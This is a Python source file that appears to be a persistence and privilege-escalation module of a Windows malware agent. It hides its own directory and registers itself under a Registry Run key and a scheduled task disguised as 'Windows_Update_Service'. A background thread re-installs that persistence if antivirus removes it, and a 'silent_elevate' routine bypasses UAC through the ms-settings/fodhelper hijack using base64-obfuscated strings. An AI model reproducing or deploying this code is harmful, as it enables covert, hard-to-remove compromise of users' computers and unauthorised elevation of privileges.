import os, sys, shutil, subprocess, ctypes, time
try: import winreg
except: winreg = None

# Apex Modules: Internal Library access
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from lib.obfuscator import _d_str

def hide_self(path=None):
    """Makes a file or directory hidden and system-protected."""
    try:
        p = path or os.path.dirname(os.path.abspath(__file__))
        ctypes.windll.kernel32.SetFileAttributesW(p, 0x02 | 0x04)
    except: pass

def install_persistence(exe_path=None):
    """Establishes dual-layer persistence for the Aurora agent."""
    if os.name != 'nt': return
    try:
        # Target for Omnipresence: SystemHost.exe in LocalAppData
        _target = os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "SystemHost.exe")
        if not exe_path: exe_path = _target

        _is_a = ctypes.windll.shell32.IsUserAnAdmin()
        _tn = "Windows_Update_Service"
        _cmd = f'"{exe_path}" --background'
        
        # 1. Registry Run Key (Persistence Layer 1)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemHost", 0, winreg.REG_SZ, _cmd)
            winreg.CloseKey(key)
        except: pass

        try:
            subprocess.run(["schtasks", "/create", "/f", "/tn", _tn, "/tr", _cmd, "/sc", "onlogon", "/rl", "highest" if _is_a else "limited"], 
                           capture_output=True, check=False)
        except OSError: 
            # Fallback for WinError 1455
            os.system(f'schtasks /create /f /tn "{_tn}" /tr "\'{_cmd}\'" /sc onlogon /rl {"highest" if _is_a else "limited"} >nul 2>&1')
    except: pass

def verify_persistence(exe_path=None, delay=30):
    """Runs in background after install — verifies persistence survived AV and re-installs if not."""
    import threading, time
    def _verify():
        time.sleep(delay)
        try:
            _target = os.path.join(os.environ.get("LOCALAPPDATA", ""), "MRL", "SystemHost.exe")
            if not exe_path: _exe = _target
            else: _exe = exe_path
            _tn = "Windows_Update_Service"
            _cmd = f'"{_exe}" --background'
            # Check registry run key
            reg_ok = False
            if winreg:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                        winreg.KEY_QUERY_VALUE)
                    val, _ = winreg.QueryValueEx(key, "SystemHost")
                    winreg.CloseKey(key)
                    reg_ok = bool(val)
                except: pass
            # Check scheduled task
            task_ok = False
            try:
                out = subprocess.check_output(["schtasks", "/query", "/tn", _tn], stderr=subprocess.DEVNULL)
                task_ok = _tn.lower() in out.decode(errors="ignore").lower()
            except: pass
            # Re-install whatever is missing
            if not reg_ok or not task_ok:
                install_persistence(_exe)
        except: pass
    threading.Thread(target=_verify, daemon=True).start()

def silent_elevate(exe_path):
    """Bypasses UAC via ms-settings registry hijack."""
    if os.name != 'nt' or ctypes.windll.shell32.IsUserAnAdmin(): return
    try:
        _rp = _d_str("U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ=")
        _cmd = f'"{sys.executable}" "{exe_path}" --install'
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, _rp)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _rp, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, _d_str("RGVsZWdhdGVFeGVjdXRl"), 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, _cmd)
        winreg.CloseKey(key)
        
        # Bypass UAC trigger
        subprocess.Popen(_d_str("Zm9kaGVscGVyLmV4ZQ=="), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, _rp)
    except: pass

if __name__ == "__main__":
    # If run standalone, it will just re-install persistence for the main entry point
    _main = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'omega_core.py'))
    install_persistence(_main)
